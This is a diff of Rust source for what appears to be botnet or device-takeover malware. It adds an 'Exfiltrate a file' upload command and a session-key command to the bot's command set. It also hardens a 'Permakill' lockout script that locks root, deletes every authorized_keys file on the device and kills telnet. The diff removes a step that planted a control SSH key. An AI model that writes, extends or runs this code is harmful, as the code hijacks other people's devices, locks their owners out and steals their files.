@@ -49,6 +49,10 @@ pub enum FbiCommand {
     Sleep(u64),
     /// Display popup message
     PopMsg(String),
+    /// Exfiltrate a file
+    Upload { path: String, url: Option<String> },
+    /// Update session key
+    SetKey(String),
 }
 
 // ── Parsing ─────────────────────────────────────────────────────────────────
@@ -200,6 +204,7 @@ impl Permakill {
 
     /// Generate full lockout script.
     pub fn generate_full_lockout(_username: &str, password: &str) -> String {
+        let escaped_pass = password.replace('\'', "'\\''").replace('\\', "\\\\").replace('\"', "\\\"").replace('$', "\\$").replace('`', "\\`");
         format!(
             r#"
 # Permakill — Credential Lockdown
@@ -216,18 +221,13 @@ passwd -l root 2>/dev/null
 # Step 3: Remove all SSH authorized keys
 find / -name authorized_keys -exec rm -f {{}} \; 2>/dev/null
 
-# Step 4: Add our key only
-mkdir -p ~/.ssh
-echo 'ssh-rsa PERMAKILL_CONTROL_KEY' > ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-
-# Step 5: Disable telnet if possible
+# Step 4: Disable telnet if possible
 killall telnetd 2>/dev/null
 systemctl disable telnet 2>/dev/null
 
 echo '[+] Permakill complete — device secured'
 "#,
-            password = password
+            password = escaped_pass
         )
     }
 }
